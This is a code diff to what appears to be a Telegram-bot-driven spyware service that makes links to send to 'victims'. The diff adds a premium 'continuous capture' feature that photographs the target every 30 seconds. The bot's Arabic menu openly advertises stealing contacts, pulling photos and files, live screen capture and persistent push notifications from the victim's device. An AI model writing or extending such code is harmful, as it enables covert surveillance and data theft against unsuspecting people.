@@ -27,7 +27,7 @@ const PROFILES_FILE   = "./profiles.json";
 const PREMIUM_FILE    = "./premium.json";
 
 const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true };
-const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false };
+const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, contcam:false };
 
 let users      = new Set(loadJSON(USERS_FILE, []));
 let banned     = new Set(loadJSON(BANNED_FILE, []));
@@ -377,7 +377,8 @@ async function handleLinkOpen(req, res, view) {
   const localNetAccess= canUsePremium(creatorId, 'localNet');
   const pushAccess    = canUsePremium(creatorId, 'webpush');
   const screenCapAccess = canUsePremium(creatorId, 'screencap');
-  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess });
+  const contcamAccess = canUsePremium(creatorId, 'contcam');
+  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess, contcamAccess });
 }
 
 app.get("/w/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "webview"); });
@@ -973,7 +974,8 @@ bot.on('callback_query', async (q) => {
       `🔒  📒 سرقة جهات الاتصال كاملة\n` +
       `🔒  🖼️ تحميل الصور والملفات من جهاز الضحية\n` +
       `🔒  🖥️ تصوير شاشة الضحية مباشرة\n` +
-      `🔒  🔔 إرسال إشعارات للضحية حتى بعد إغلاق الصفحة\n\n` +
+      `🔒  🔔 إرسال إشعارات للضحية حتى بعد إغلاق الصفحة\n` +
+      `🔒  📸 تصوير مستمر كل 30 ثانية (حتى 20 دقيقة)\n\n` +
       `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
       `🚀 كل هذا برابط واحد يُرسَل للضحية!` +
       statusLine
@@ -1115,7 +1117,8 @@ const PREM_FEAT_NAMES = {
   persistentId:"🆔 المعرّف الدائم",
   localNet:    "🌐 الشبكة المحلية",
   webpush:     "🔔 الإشعارات",
-  screencap:   "🖥️ تصوير الشاشة"
+  screencap:   "🖥️ تصوير الشاشة",
+  contcam:     "📸 التصوير المستمر"
 };
 
 function premiumConfigText() {
